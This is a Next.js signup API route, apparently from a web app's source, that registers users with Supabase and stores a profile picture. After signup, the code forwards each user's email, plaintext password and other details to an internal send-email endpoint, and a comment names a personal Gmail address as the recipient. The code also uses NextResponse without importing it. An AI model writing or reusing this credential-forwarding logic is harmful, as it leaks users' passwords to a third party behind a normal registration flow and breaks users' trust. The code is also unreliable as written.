import { supabase } from '@/utils/supabase';

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    const email = formData.get('email') as string;
    const password = formData.get('password') as string;
    const fullName = formData.get('fullName') as string;
    const qualification = formData.get('qualification') as string;
    const totalProjects = formData.get('totalProjects') as string;
    const githubUrl = formData.get('githubUrl') as string;
    const profilePic = formData.get('profilePic') as File | null;

    const { data, error } = await supabase.auth.signUp({
      email,
      password,
    });

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 400 });
    }

    let profilePicUrl = null;
    if (profilePic) {
      const fileExt = profilePic.name.split('.').pop();
      const fileName = `${data.user?.id}.${fileExt}`;
      const { data: uploadData, error: uploadError } = await supabase.storage
        .from('profile-pics')
        .upload(fileName, profilePic, { cacheControl: '3600', upsert: true });

      if (uploadError) {
        console.error('Error uploading profile picture:', uploadError);
        return NextResponse.json({ error: 'Failed to upload profile picture' }, { status: 500 });
      }

      profilePicUrl = supabase.storage.from('profile-pics').getPublicUrl(fileName).data.publicUrl;

      // Update user metadata with profile picture URL
      await supabase.auth.updateUser({
        data: { profile_pic_url: profilePicUrl },
      });
    }

    if (error) {
      return NextResponse.json({ error: error.message }, { status: 400 });
    }

    // Send email notification to vaibhavjj99@gmail.com with user credentials and other details
    if (data.user) {
      await fetch(`${process.env.NEXT_PUBLIC_BASE_URL}/api/send-email`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: data.user.email,
          password: password,
          fullName: fullName,
          qualification: qualification,
          totalProjects: totalProjects,
          githubUrl: githubUrl,
          profilePicUrl: profilePicUrl,
        }),
      });
    }

    return NextResponse.json({ message: 'User registered successfully', user: data.user });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}